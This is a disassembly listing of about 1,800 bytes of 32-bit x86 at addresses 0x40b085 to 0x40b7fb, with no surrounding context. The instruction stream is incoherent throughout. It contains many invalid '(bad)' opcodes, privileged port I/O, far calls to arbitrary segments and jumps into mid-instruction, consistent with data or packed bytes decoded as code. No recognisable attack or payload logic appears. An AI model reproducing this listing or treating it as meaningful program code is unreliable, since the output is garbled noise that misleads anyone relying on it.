  40b085:	cmp    edx,DWORD PTR ds:0xd0c75d7b
  40b08b:	retf   
  40b08c:	or     ch,bl
  40b08e:	fld    DWORD PTR [ecx-0x68e1f73a]
  40b094:	or     DWORD PTR [ecx+ebx*8+0x4c0759b9],ebx
  40b09b:	xchg   edi,eax
  40b09c:	push   edx
  40b09d:	pop    es
  40b09e:	push   0x6f85506f
  40b0a3:	inc    ebp
  40b0a4:	or     BYTE PTR [ecx],0xac
  40b0a7:	lods   al,BYTE PTR ds:[esi]
  40b0a8:	jge    0x40b0ed
  40b0aa:	xlat   BYTE PTR ds:[ebx]
  40b0ab:	add    edi,eax
  40b0ad:	add    al,0xfe
  40b0af:	mov    bl,0x11
  40b0b1:	mov    edi,0x87e2eaba
  40b0b6:	or     eax,0x87e06a32
  40b0bb:	js     0x40b0d7
  40b0bd:	xchg   BYTE PTR [eax+ebp*1+0x1669b429],ch
  40b0c4:	scas   al,BYTE PTR es:[edi]
  40b0c5:	jns    0x40b12d
  40b0c7:	gs and eax,0x525f7f8c
  40b0cd:	and    esp,DWORD PTR [ebp+0x7529c602]
  40b0d3:	xor    DWORD PTR [edx-0x21ee73a7],ebx
  40b0d9:	dec    eax
  40b0da:	mov    esi,0x2ba46d20
  40b0df:	mov    ds:0xd1c5a8c7,eax
  40b0e4:	jns    0x40b155
  40b0e6:	sbb    esp,DWORD PTR ds:0x6851ac77
  40b0ec:	mov    eax,ds
  40b0ee:	mov    ds:0xf8e08d41,al
  40b0f3:	sbb    cl,bh
  40b0f5:	jp     0x40b0e9
  40b0f7:	sub    bl,al
  40b0f9:	jnp    0x40b0dd
  40b0fb:	inc    ebp
  40b0fc:	mov    bh,0x39
  40b0fe:	shr    BYTE PTR [edi+0x2b3c260b],cl
  40b104:	jp     0x40b179
  40b106:	mov    esp,0x99475d62
  40b10b:	cmp    edx,DWORD PTR [ebx+0x13]
  40b10e:	(bad)  
  40b10f:	test   BYTE PTR [edi+0x55],cl
  40b112:	fadd   QWORD PTR [ecx+edi*1-0x5c6d3fd5]
  40b119:	jge    0x40b0a7
  40b11b:	cmp    BYTE PTR [ecx+edi*4],0x73
  40b11f:	adc    ebx,ebx
  40b121:	or     al,BYTE PTR ds:0x9612e336
  40b127:	dec    esi
  40b128:	ret    0x4127
  40b12b:	push   es
  40b12c:	outs   dx,DWORD PTR ds:[esi]
  40b12d:	mov    bh,0xb8
  40b12f:	ja     0x40b157
  40b131:	cmc    
  40b132:	(bad)  
  40b133:	or     esp,ebx
  40b135:	xlat   BYTE PTR ds:[ebx]
  40b136:	mov    eax,0x267e771f
  40b13b:	std    
  40b13c:	inc    BYTE PTR [esi]
  40b13e:	(bad)  
  40b140:	lods   al,BYTE PTR ds:[esi]
  40b141:	ins    WORD PTR es:[edi],dx
  40b143:	xor    BYTE PTR [edi+ecx*8-0x34],dh
  40b147:	fimul  WORD PTR [edx+edx*2]
  40b14a:	(bad)  
  40b14c:	les    ebp,FWORD PTR [eax-0x46e0a633]
  40b152:	xor    eax,0x2232db6b
  40b157:	mov    edx,0x1757d4e7
  40b15c:	scas   al,BYTE PTR es:[edi]
  40b15d:	(bad)  
  40b15e:	push   eax
  40b15f:	mov    eax,0xb314823a
  40b164:	inc    edx
  40b165:	inc    esp
  40b166:	mov    al,0xb9
  40b168:	sar    DWORD PTR [ebx+0x29743700],1
  40b16e:	push   edx
  40b16f:	add    bl,BYTE PTR [esi]
  40b171:	loope  0x40b128
  40b173:	test   ebx,ebx
  40b175:	inc    ecx
  40b176:	add    al,0x3a
  40b178:	test   eax,0x1556a697
  40b17d:	sti    
  40b17e:	jns    0x40b1de
  40b180:	out    dx,eax
  40b181:	arpl   cx,bx
  40b183:	fidiv  DWORD PTR [eax+esi*1+0xbcf7770]
  40b18a:	mov    ds:0x526f64be,eax
  40b18f:	repz dec eax
  40b191:	dec    ebx
  40b192:	and    BYTE PTR [ebp+esi*4-0x60],dl
  40b196:	add    edx,esp
  40b198:	outs   dx,BYTE PTR ds:[esi]
  40b199:	cmp    eax,0xc55b5e2c
  40b19e:	sbb    BYTE PTR [ebp+0x157f5055],dh
  40b1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1a5:	addr16 mov cl,0x6b
  40b1a8:	inc    edi
  40b1a9:	pop    ds
  40b1aa:	fwait
  40b1ab:	cmp    al,0x26
  40b1ad:	sbb    ebx,DWORD PTR [edi+0x63aac151]
  40b1b3:	retf   
  40b1b4:	outs   dx,DWORD PTR ds:[esi]
  40b1b5:	inc    edx
  40b1b6:	push   es
  40b1b7:	lods   al,BYTE PTR ds:[esi]
  40b1b8:	int3   
  40b1b9:	adc    al,0xf
  40b1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bc:	xchg   esp,edi
  40b1be:	add    al,0x58
  40b1c0:	mov    edi,0x81c92dd3
  40b1c5:	inc    BYTE PTR [ebx+0x683f163c]
  40b1cb:	and    BYTE PTR [esi+0x4a],dh
  40b1ce:	aaa    
  40b1cf:	int    0xbb
  40b1d1:	and    DWORD PTR ds:0xb0e43c54,esp
  40b1d7:	cdq    
  40b1d8:	add    esi,DWORD PTR [ebp+eiz*2-0x56e4b034]
  40b1df:	pop    ds
  40b1e0:	pop    ebp
  40b1e1:	popf   
  40b1e2:	dec    esp
  40b1e3:	pop    es
  40b1e4:	mov    al,ds:0xa8d4119e
  40b1e9:	and    BYTE PTR [edx+0x7bf1668a],dl
  40b1ef:	push   ebx
  40b1f0:	leave  
  40b1f1:	iret   
  40b1f2:	adc    esi,ecx
  40b1f4:	add    BYTE PTR [ebx-0x2f679cbf],cl
  40b1fa:	int3   
  40b1fb:	call   0x8fc3:0x6ae55203
  40b202:	ja     0x40b201
  40b204:	bound  edx,QWORD PTR [edi+eax*1+0x5d8cbd0c]
  40b20b:	dec    edi
  40b20c:	in     al,dx
  40b20d:	pop    eax
  40b20e:	mov    dh,0xcd
  40b210:	mov    al,0xb1
  40b212:	sahf   
  40b213:	add    eax,0xf59a11fe
  40b218:	add    eax,0x5913ffcc
  40b21d:	dec    esp
  40b21e:	pop    edi
  40b21f:	adc    dl,ah
  40b221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b222:	push   ds
  40b223:	call   0xa33fcc11
  40b228:	mov    al,ds:0xe2accd39
  40b22d:	loope  0x40b23f
  40b22f:	sbb    ecx,eax
  40b231:	push   0x22b4fa52
  40b236:	je     0x40b2b5
  40b238:	cmp    BYTE PTR [eax+0x43],0x2c
  40b23c:	(bad)  
  40b23d:	push   edx
  40b23e:	into   
  40b23f:	in     al,dx
  40b240:	ss pushf 
  40b242:	aaa    
  40b243:	cli    
  40b244:	bound  eax,QWORD PTR [ebx-0x16]
  40b247:	imul   esp,ecx,0x8b62fe02
  40b24d:	inc    ecx
  40b24e:	or     cl,cl
  40b250:	push   esi
  40b251:	pop    eax
  40b252:	add    dl,BYTE PTR [ebp-0x51f1074c]
  40b258:	stos   DWORD PTR es:[edi],eax
  40b259:	je     0x40b27b
  40b25b:	jle    0x40b28b
  40b25d:	test   eax,0x45a05590
  40b262:	addr16 xchg ebx,eax
  40b264:	dec    esi
  40b265:	mov    dh,bl
  40b267:	addr16 inc edx
  40b269:	cmp    bl,dh
  40b26b:	xchg   esp,eax
  40b26c:	push   esi
  40b26d:	dec    ebx
  40b26e:	jne    0x40b2ec
  40b270:	ins    DWORD PTR es:[edi],dx
  40b271:	xchg   esi,eax
  40b272:	loopne 0x40b231
  40b274:	pop    eax
  40b275:	push   0xebf509c2
  40b27a:	mov    dh,0x2b
  40b27c:	out    0xef,al
  40b27e:	adc    DWORD PTR [esp+edi*1-0x484b37f6],ebp
  40b285:	ficom  DWORD PTR [esi+0x2f74ed11]
  40b28b:	sub    al,0xe2
  40b28d:	sbb    cl,BYTE PTR [edx]
  40b28f:	xor    al,0xa5
  40b291:	pusha  
  40b292:	mov    DWORD PTR ds:0xd5b86e1c,esi
  40b298:	mov    edi,0x5ebc6355
  40b29d:	dec    esp
  40b29e:	mov    dl,0x21
  40b2a0:	dec    edi
  40b2a1:	dec    ebx
  40b2a2:	in     al,dx
  40b2a3:	fisubr WORD PTR [eax+0x2bb672ec]
  40b2a9:	mov    ch,0xfc
  40b2ab:	adc    eax,esp
  40b2ad:	fs sub dh,0xd4
  40b2b1:	loope  0x40b2b0
  40b2b3:	inc    esp
  40b2b4:	and    BYTE PTR [eax],bl
  40b2b6:	xchg   esp,ebp
  40b2b8:	fmul   DWORD PTR [edi]
  40b2ba:	fcomp  DWORD PTR [edi+0x1e845d13]
  40b2c0:	fsubr  QWORD PTR es:[ebp+0x43]
  40b2c4:	clc    
  40b2c5:	push   ss
  40b2c6:	add    ah,BYTE PTR [edx]
  40b2c8:	inc    ebx
  40b2c9:	fdivr  QWORD PTR [edi+ecx*8-0x47e3922a]
  40b2d0:	enter  0xe2c5,0x92
  40b2d4:	and    BYTE PTR [ecx],dh
  40b2d6:	arpl   WORD PTR [ebx],si
  40b2d8:	sbb    bh,BYTE PTR [edi]
  40b2da:	call   ecx
  40b2dc:	ficomp WORD PTR [edi-0x519aa68e]
  40b2e2:	mov    ebx,0x4735fa7c
  40b2e7:	xchg   BYTE PTR [esi-0x24],al
  40b2ea:	cmp    edx,esi
  40b2ec:	or     bl,BYTE PTR [edx+0x524eb1fd]
  40b2f2:	pushfw 
  40b2f4:	in     al,dx
  40b2f5:	push   0xaebcdcdb
  40b2fa:	pop    ss
  40b2fb:	pop    ebx
  40b2fc:	clc    
  40b2fd:	dec    edx
  40b2fe:	push   esi
  40b2ff:	ror    DWORD PTR [ebp-0xee565a4],1
  40b305:	rol    ch,1
  40b307:	push   esi
  40b308:	shr    BYTE PTR [ebp*2-0x6bf1ebf8],0xa8
  40b310:	shl    cl,cl
  40b312:	push   ecx
  40b313:	cmp    eax,0x564dbb2c
  40b318:	and    BYTE PTR [edx],dl
  40b31a:	hlt    
  40b31b:	cmc    
  40b31c:	(bad)  
  40b31d:	dec    edi
  40b31e:	rol    DWORD PTR [edx+0x13bc8b14],cl
  40b324:	inc    esp
  40b325:	enter  0x3080,0xda
  40b329:	in     al,dx
  40b32a:	(bad)  
  40b32b:	in     al,dx
  40b32c:	mov    eax,0xb74a67a9
  40b331:	jge    0x40b399
  40b333:	push   esp
  40b334:	dec    BYTE PTR [edx]
  40b336:	jno    0x40b312
  40b338:	mov    cl,0x6b
  40b33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b33b:	sbb    DWORD PTR [edx],eax
  40b33d:	jo     0x40b2cc
  40b33f:	lods   al,BYTE PTR ds:[esi]
  40b340:	popf   
  40b341:	test   esi,ebp
  40b343:	sbb    edi,DWORD PTR [edx]
  40b345:	xchg   DWORD PTR [edx-0x5795c489],edi
  40b34b:	call   0x6c04:0x53c13632
  40b352:	mov    ds:0x97bcff7f,al
  40b357:	outs   dx,DWORD PTR ds:[esi]
  40b358:	jge    0x40b3a0
  40b35a:	push   edx
  40b35b:	(bad)  
  40b35c:	xor    ah,BYTE PTR [eax]
  40b35e:	jl     0x40b2fc
  40b360:	push   ss
  40b361:	cli    
  40b362:	data16 sti 
  40b364:	pop    ebx
  40b365:	rol    DWORD PTR [edi-0x7c45150e],0x8c
  40b36c:	imul   ecx,DWORD PTR [ebx],0xffffffe1
  40b36f:	in     al,0xe1
  40b371:	retf   0x1a79
  40b374:	adc    dl,BYTE PTR [ecx-0x5b6ec584]
  40b37a:	fimul  DWORD PTR [edi]
  40b37c:	popf   
  40b37d:	mov    bh,0xc2
  40b37f:	mov    bl,0xdc
  40b381:	call   0x1fe1:0x7f3c305
  40b388:	pop    edx
  40b389:	cmp    BYTE PTR [ebx-0x4f334156],cl
  40b38f:	xor    ebp,DWORD PTR [edx+eiz*1+0x14]
  40b393:	and    ecx,DWORD PTR [ebp-0x23]
  40b396:	in     eax,dx
  40b397:	mov    ebx,DWORD PTR [ecx]
  40b399:	fs jae 0x40b3cc
  40b39c:	adc    ch,BYTE PTR [esi-0x6033fbf2]
  40b3a2:	frstor [ebp-0x56]
  40b3a5:	icebp  
  40b3a6:	aam    0x92
  40b3a8:	retf   
  40b3a9:	push   cs
  40b3aa:	jb     0x40b41a
  40b3ac:	stos   DWORD PTR es:[edi],eax
  40b3ad:	cmp    BYTE PTR [edx-0x66918e83],dl
  40b3b3:	out    dx,al
  40b3b4:	(bad)  
  40b3b5:	mov    edi,0x7350830e
  40b3ba:	mov    ebp,0xf86eee34
  40b3bf:	push   ss
  40b3c0:	ja     0x40b35e
  40b3c2:	pop    eax
  40b3c3:	nop    DWORD PTR ss:[eax+0x2821fc0b]
  40b3cb:	or     BYTE PTR [eax],ch
  40b3cd:	(bad)  
  40b3ce:	std    
  40b3cf:	or     dh,BYTE PTR [esi+0x11dbdb5b]
  40b3d5:	stos   BYTE PTR es:[edi],al
  40b3d6:	ja     0x40b394
  40b3d8:	pushf  
  40b3d9:	mov    esi,0x3999b0f6
  40b3de:	shl    DWORD PTR [ebx+ebx*2-0x42d2e22c],1
  40b3e5:	mov    gs,ecx
  40b3e7:	and    al,0x60
  40b3e9:	inc    ebp
  40b3ea:	xchg   ebp,eax
  40b3eb:	imul   BYTE PTR [ebp+0x74]
  40b3ee:	adc    al,BYTE PTR [ebx+0x464025bc]
  40b3f4:	pop    edx
  40b3f5:	jg     0x40b3ee
  40b3f7:	ror    DWORD PTR [esi+0x78],0x46
  40b3fb:	je     0x40b3c8
  40b3fd:	lods   al,BYTE PTR ds:[esi]
  40b3fe:	mov    bl,0x55
  40b400:	inc    ecx
  40b401:	sti    
  40b402:	jb     0x40b474
  40b404:	pop    ebp
  40b405:	mov    BYTE PTR [ecx],ch
  40b407:	retf   0x1718
  40b40a:	addr16 pusha 
  40b40c:	jno    0x40b3e8
  40b40e:	imul   esp,DWORD PTR [esi-0x64],0x5f
  40b412:	jmp    0x40b47c
  40b414:	sub    al,0xcc
  40b416:	sbb    al,0xc0
  40b418:	or     DWORD PTR [edi-0x24469a8],esp
  40b41e:	jae    0x40b3ff
  40b420:	adc    ah,BYTE PTR ss:[eax-0x252adb53]
  40b427:	mov    al,0x5d
  40b429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b42a:	mov    ebx,DWORD PTR [eax+ecx*4]
  40b42d:	ror    BYTE PTR [eax-0x4937e45e],1
  40b433:	jno    0x40b3be
  40b435:	inc    BYTE PTR [esp+edx*2]
  40b438:	lds    edi,FWORD PTR [ecx-0x46]
  40b43b:	mov    ecx,0xef9d23fa
  40b440:	xor    ch,BYTE PTR [ecx]
  40b442:	cs fs icebp 
  40b445:	add    al,0x93
  40b447:	mov    edx,edx
  40b449:	inc    eax
  40b44a:	fild   WORD PTR [edx]
  40b44c:	jo     0x40b427
  40b44e:	push   cs
  40b44f:	mov    bh,0xa3
  40b451:	adc    al,0x43
  40b454:	lock mov bh,BYTE PTR [eax]
  40b457:	xlat   BYTE PTR ds:[ebx]
  40b458:	call   0x6b7fbc8b
  40b45d:	idiv   BYTE PTR [edi]
  40b45f:	push   eax
  40b460:	loope  0x40b46d
  40b462:	jne    0x40b4c0
  40b464:	mov    ebx,0xf321e30
  40b469:	mov    al,ds:0xd4639bec
  40b46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b46f:	(bad)  
  40b471:	cmp    al,0x34
  40b473:	je     0x40b4da
  40b475:	neg    DWORD PTR [eax]
  40b477:	pop    edx
  40b478:	ja     0x40b4ac
  40b47a:	sbb    eax,0x2cab6f0f
  40b47f:	and    al,0xe7
  40b481:	mov    edi,0x44b2e0d1
  40b486:	pop    es
  40b487:	rcr    DWORD PTR [esi+0x54f52e14],cl
  40b48d:	jl     0x40b42b
  40b48f:	call   0x63e64cfa
  40b494:	repz push esp
  40b496:	adc    esi,DWORD PTR [esi+0x7c66eb97]
  40b49c:	loope  0x40b42e
  40b49e:	es mov dh,0xdb
  40b4a1:	add    eax,0x62ec3223
  40b4a6:	mov    ss,WORD PTR [ecx+0x1cba313e]
  40b4ac:	mov    dl,0x64
  40b4ae:	pop    ecx
  40b4af:	out    dx,al
  40b4b0:	sbb    BYTE PTR [edi+0x4ee438c5],dl
  40b4b6:	mov    edi,0xd7dcd3b1
  40b4bb:	(bad)  
  40b4bc:	mov    bh,0x20
  40b4be:	jnp    0x40b49d
  40b4c0:	jp     0x40b492
  40b4c2:	cmp    esp,0xf8a4f9a
  40b4c8:	push   cs
  40b4c9:	ds ja  0x40b51b
  40b4cc:	daa    
  40b4cd:	fstp   st(3)
  40b4cf:	inc    eax
  40b4d0:	dec    edx
  40b4d1:	cdq    
  40b4d2:	arpl   WORD PTR [ecx-0x42],cx
  40b4d5:	xchg   ecx,eax
  40b4d6:	or     DWORD PTR [esi-0x2a],esp
  40b4d9:	inc    esp
  40b4da:	push   esi
  40b4dc:	cmp    bl,BYTE PTR ds:0x281c2a3
  40b4e2:	cwde   
  40b4e3:	aad    0x79
  40b4e5:	cli    
  40b4e6:	mov    edi,0x6f2f9bbe
  40b4eb:	idiv   BYTE PTR [edx]
  40b4ed:	aaa    
  40b4ee:	dec    ebx
  40b4ef:	lahf   
  40b4f0:	(bad)  
  40b4f1:	std    
  40b4f2:	pusha  
  40b4f3:	and    edx,DWORD PTR [edi+0x1e3a6c89]
  40b4f9:	js     0x40b545
  40b4fb:	dec    ebx
  40b4fc:	pop    edi
  40b4fd:	(bad)  
  40b4fe:	in     al,dx
  40b4ff:	pop    esp
  40b500:	rol    DWORD PTR [edi+0x63],1
  40b503:	add    al,0x34
  40b505:	lahf   
  40b506:	xchg   edx,eax
  40b507:	dec    edx
  40b508:	dec    edx
  40b509:	push   esi
  40b50a:	fcmovnbe st,st(5)
  40b50c:	cdq    
  40b50d:	pop    ebx
  40b50e:	ret    
  40b50f:	arpl   WORD PTR [esi],ax
  40b511:	add    eax,0x8c695251
  40b516:	lea    edi,[ecx-0x853bab6]
  40b51c:	sub    BYTE PTR [edx],al
  40b51e:	fs add ebp,eax
  40b521:	in     al,0x47
  40b523:	xchg   esi,ecx
  40b525:	cmc    
  40b526:	inc    edi
  40b527:	xchg   esp,eax
  40b528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b529:	fs pop edi
  40b52b:	mov    dh,bl
  40b52d:	mov    ah,0x3c
  40b52f:	out    0x62,al
  40b531:	mov    al,ds:0xafbe4283
  40b536:	xchg   ebx,eax
  40b537:	ret    0x17bd
  40b53a:	lds    edx,FWORD PTR [ebx+ebx*1+0x30]
  40b53e:	int    0x85
  40b540:	mov    eax,ds:0x3a02cd20
  40b545:	sub    cl,cl
  40b547:	jge    0x40b509
  40b549:	cs xor eax,0x7f2bc3d0
  40b54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b550:	adc    BYTE PTR [ebx-0x3f],bl
  40b553:	mov    ebx,0xcfdcbfac
  40b558:	js     0x40b5d8
  40b55a:	or     BYTE PTR [ebp-0x76],ah
  40b55d:	push   esi
  40b55e:	inc    ebp
  40b55f:	xor    eax,0xa78c2df7
  40b564:	shr    dl,0x18
  40b567:	pop    edi
  40b568:	ja     0x40b561
  40b56a:	cmp    ah,BYTE PTR [eax]
  40b56c:	mov    eax,0xcfe1ccd6
  40b571:	int    0x3a
  40b573:	out    dx,al
  40b574:	push   cs
  40b575:	dec    ebx
  40b576:	fnstsw WORD PTR [edi]
  40b578:	push   esp
  40b579:	lock dec edx
  40b57b:	mov    ch,dl
  40b57d:	retf   
  40b57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b57f:	mov    cl,0xc3
  40b581:	xor    DWORD PTR [eax],edi
  40b583:	mov    ecx,DWORD PTR [ebp-0x9]
  40b586:	xchg   edi,eax
  40b587:	add    BYTE PTR [ebx],cl
  40b589:	push   ebx
  40b58a:	stos   DWORD PTR es:[edi],eax
  40b58b:	xchg   esi,eax
  40b58c:	mov    eax,0x4ce8ffee
  40b591:	mov    esp,0x2b98bf46
  40b596:	pop    edi
  40b597:	fstp   DWORD PTR [ecx+esi*4-0x2f6d05fa]
  40b59e:	cmp    dl,BYTE PTR [edx+0x5757be18]
  40b5a4:	retf   
  40b5a5:	push   es
  40b5a6:	inc    esi
  40b5a7:	and    BYTE PTR [esi-0x15],bl
  40b5aa:	retf   0x45ab
  40b5ad:	mov    ebp,0x9b222857
  40b5b2:	sub    esi,0xffffffb9
  40b5b5:	xchg   DWORD PTR [esi+0x50],esp
  40b5b8:	loope  0x40b588
  40b5ba:	stos   DWORD PTR es:[edi],eax
  40b5bb:	mov    ds:0xac85eeeb,eax
  40b5c0:	sub    ecx,DWORD PTR [eax-0x3b1a9ef1]
  40b5c6:	dec    ebx
  40b5c7:	fild   DWORD PTR [esi]
  40b5c9:	sbb    dl,bl
  40b5cb:	pop    ds
  40b5cc:	clc    
  40b5cd:	in     eax,0xcb
  40b5cf:	dec    edi
  40b5d0:	fwait
  40b5d1:	xor    BYTE PTR [ecx],ah
  40b5d3:	jmp    0x9052:0x35a68b93
  40b5da:	icebp  
  40b5db:	popf   
  40b5dc:	dec    ebx
  40b5dd:	xchg   edi,eax
  40b5de:	mov    ebx,0xdcdbaf2c
  40b5e4:	cmp    ecx,0x49
  40b5e7:	fidivr DWORD PTR [esi+0x542de13]
  40b5ed:	pop    eax
  40b5ee:	loope  0x40b593
  40b5f0:	pop    es
  40b5f1:	adc    al,0xb
  40b5f3:	inc    esp
  40b5f4:	imul   DWORD PTR [ebx+0x6bcf271e]
  40b5fa:	(bad)  
  40b5fb:	scas   al,BYTE PTR es:[edi]
  40b5fc:	cmp    eax,0xd0afb3f
  40b601:	mov    eax,0x718f7cfd
  40b606:	pop    esi
  40b607:	scas   al,BYTE PTR es:[edi]
  40b608:	bound  ebp,QWORD PTR [edx-0x70]
  40b60b:	pushf  
  40b60c:	je     0x40b5d4
  40b60e:	fisttp QWORD PTR [ebp-0x32]
  40b611:	push   es
  40b612:	es mov ah,0x60
  40b615:	sti    
  40b616:	xor    al,0x17
  40b618:	loop   0x40b66a
  40b61a:	stos   DWORD PTR es:[edi],eax
  40b61b:	mov    esi,0xcec97b92
  40b620:	inc    edi
  40b621:	adc    ecx,DWORD PTR [esp+eiz*8]
  40b624:	mov    ah,0xde
  40b626:	mov    gs,WORD PTR [edi]
  40b628:	push   cs
  40b629:	pop    edx
  40b62a:	xchg   edx,eax
  40b62b:	cmp    eax,0x90818370
  40b630:	mov    edi,0xc99f2c7c
  40b635:	nop
  40b636:	adc    BYTE PTR [edx],dl
  40b638:	jmp    DWORD PTR [edi-0x74565511]
  40b63e:	xor    ebx,eax
  40b640:	mov    dl,0xc5
  40b642:	lds    esi,FWORD PTR [ecx]
  40b644:	dec    DWORD PTR [edi-0x8]
  40b647:	xchg   ecx,eax
  40b648:	xchg   ebp,eax
  40b649:	add    al,0x12
  40b64b:	or     BYTE PTR [edi-0x17],ch
  40b64e:	repnz xchg esp,eax
  40b650:	enter  0xf72d,0x58
  40b654:	mov    ah,0xda
  40b656:	mov    al,0xe5
  40b658:	mov    DWORD PTR [ebx+0x1b],edx
  40b65b:	loopne 0x40b67f
  40b65d:	dec    eax
  40b65e:	jecxz  0x40b6a0
  40b660:	aad    0x96
  40b662:	popa   
  40b663:	shl    DWORD PTR [edx-0x25],0x5a
  40b667:	cmc    
  40b668:	mov    ds:0x6af1bff4,eax
  40b66d:	rol    ebx,cl
  40b66f:	and    al,0xa0
  40b671:	inc    eax
  40b672:	jle    0x40b6c4
  40b674:	nop
  40b675:	pop    edx
  40b676:	pusha  
  40b677:	pop    esi
  40b678:	pop    ds
  40b679:	shl    BYTE PTR [edi-0x1d8a925],0xce
  40b680:	push   ds
  40b681:	cmp    ecx,DWORD PTR [ecx-0x2a1b7255]
  40b687:	ins    BYTE PTR es:[edi],dx
  40b688:	scas   eax,DWORD PTR es:[edi]
  40b689:	or     DWORD PTR [eax],edi
  40b68b:	jbe    0x40b69e
  40b68d:	fimul  DWORD PTR [edx+0x1ac28b97]
  40b693:	rcl    BYTE PTR [esi-0x70dfc3bd],0x68
  40b69a:	imul   edi,DWORD PTR [ebp+0x3c414775],0xffffff95
  40b6a1:	pop    esi
  40b6a2:	pop    ebx
  40b6a3:	mov    eax,ds:0x90abadf3
  40b6a8:	push   ebp
  40b6a9:	int3   
  40b6aa:	inc    esp
  40b6ab:	jp     0x40b669
  40b6ad:	ja     0x40b681
  40b6af:	sub    eax,0xc115f43e
  40b6b4:	ret    
  40b6b5:	jnp    0x40b6e7
  40b6b7:	sbb    BYTE PTR [ebp+edi*4-0x2],ch
  40b6bb:	push   ss
  40b6bc:	dec    edx
  40b6bd:	rcr    BYTE PTR ds:[edx+esi*8+0x290616a6],1
  40b6c5:	sub    eax,0x103d7ffc
  40b6ca:	rol    BYTE PTR [ebp+0x78744589],1
  40b6d0:	mov    eax,ds:0x20d61ae7
  40b6d5:	inc    ebx
  40b6d6:	imul   esi,DWORD PTR [ebp+0x25265a7d],0x8310bcaa
  40b6e0:	imul   esi,DWORD PTR [edx+eiz*4],0x63dace6a
  40b6e7:	push   esi
  40b6e8:	das    
  40b6e9:	xchg   ebx,eax
  40b6ea:	sar    BYTE PTR [ebp+0x5c],cl
  40b6ed:	ja     0x40b76e
  40b6ef:	mov    edi,0x9fd73421
  40b6f4:	mov    bl,0xaa
  40b6f6:	retf   
  40b6f7:	push   0x56
  40b6f9:	jle    0x40b751
  40b6fb:	into   
  40b6fc:	sub    eax,0xa60ce080
  40b701:	xlat   BYTE PTR ds:[ebx]
  40b702:	sbb    dl,ah
  40b704:	es (bad) 
  40b706:	test   ecx,esi
  40b708:	and    DWORD PTR [ebx],0xbde667bb
  40b70e:	jae    0x40b729
  40b710:	inc    ecx
  40b711:	sahf   
  40b712:	xor    DWORD PTR [edi-0x47],eax
  40b715:	push   ebx
  40b716:	sub    al,0x1b
  40b718:	dec    eax
  40b719:	mov    DWORD PTR [ebp+0x551f52b4],edi
  40b71f:	int3   
  40b720:	jnp    0x40b717
  40b722:	dec    ebx
  40b723:	jp     0x40b6e7
  40b725:	inc    ebp
  40b726:	scas   eax,DWORD PTR es:[edi]
  40b727:	sub    bh,BYTE PTR [edi]
  40b729:	push   cs
  40b72a:	xchg   BYTE PTR [ebp-0x68b9c516],bl
  40b730:	dec    edi
  40b731:	and    ah,dh
  40b733:	ror    DWORD PTR ds:0xd60f60f4,cl
  40b739:	scas   al,BYTE PTR es:[edi]
  40b73a:	inc    esi
  40b73b:	cld    
  40b73c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b73d:	std    
  40b73e:	std    
  40b73f:	pop    ebx
  40b740:	stos   DWORD PTR es:[edi],eax
  40b741:	iret   
  40b742:	cli    
  40b743:	pusha  
  40b744:	int    0x4b
  40b746:	push   ebx
  40b747:	cwde   
  40b748:	jg     0x40b6e3
  40b74a:	adc    BYTE PTR [eax+ebx*1],al
  40b74d:	sbb    ch,BYTE PTR [ebx-0x18]
  40b750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b751:	(bad)  
  40b752:	(bad)  
  40b754:	imul   esp,DWORD PTR [edx],0x9cd7471f
  40b75a:	or     eax,0x12
  40b75d:	mov    DWORD PTR [edx],ecx
  40b75f:	(bad)  
  40b760:	push   0xffffffde
  40b762:	add    ch,BYTE PTR [edi+0x399d180e]
  40b768:	je     0x40b7bc
  40b76a:	mov    bl,0x88
  40b76c:	jle    0x40b7b7
  40b76e:	daa    
  40b76f:	mov    esi,0xfefd7274
  40b774:	mov    bh,BYTE PTR [edx]
  40b776:	shl    DWORD PTR [esi+ebp*2],0x4a
  40b77a:	dec    edi
  40b77b:	fisttp WORD PTR [ebx]
  40b77d:	sbb    eax,0xdfd0ea13
  40b782:	push   ecx
  40b783:	xor    ch,BYTE PTR [edx+0x60d5af8]
  40b789:	cmp    dh,BYTE PTR [ebx+0x7a6a07f7]
  40b78f:	cwde   
  40b790:	cli    
  40b791:	jl     0x40b7b0
  40b793:	jmp    0x9e527688
  40b798:	inc    ecx
  40b799:	popf   
  40b79a:	xchg   ecx,eax
  40b79b:	pop    es
  40b79c:	outs   dx,DWORD PTR ds:[esi]
  40b79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b79f:	pop    esi
  40b7a0:	jge    0x40b7bc
  40b7a2:	dec    eax
  40b7a3:	or     eax,0x7940edbc
  40b7a8:	aam    0xee
  40b7aa:	iret   
  40b7ab:	sub    BYTE PTR [eax-0x4bc49501],bl
  40b7b1:	cli    
  40b7b2:	clc    
  40b7b3:	(bad)  
  40b7b4:	ins    DWORD PTR es:[edi],dx
  40b7b5:	or     BYTE PTR [ebx],ah
  40b7b7:	mov    ds:0x550b9eb8,al
  40b7bc:	mov    eax,ds:0x7a51fffd
  40b7c1:	dec    edi
  40b7c2:	sbb    BYTE PTR [edx],0xc4
  40b7c5:	leave  
  40b7c6:	in     al,dx
  40b7c7:	push   ebp
  40b7c8:	rcl    BYTE PTR ds:[edx+0x64638193],0x44
  40b7d0:	call   FWORD PTR [ebp+ecx*4+0x5ecb002e]
  40b7d7:	sub    bh,BYTE PTR [eax]
  40b7d9:	shl    BYTE PTR [eax+0x2b5f8558],1
  40b7df:	inc    esi
  40b7e0:	jns    0x40b7bb
  40b7e2:	(bad)  [ebp*8-0xf402f12]
  40b7e9:	add    eax,0xa1e01e6d
  40b7ee:	nop
  40b7ef:	mov    DWORD PTR [eax+0x1e65bac9],esi
  40b7f5:	(bad)  
  40b7f6:	push   ss
  40b7f7:	(bad)  
  40b7f8:	in     eax,dx
  40b7f9:	out    0x67,al
  40b7fb:	(bad)  
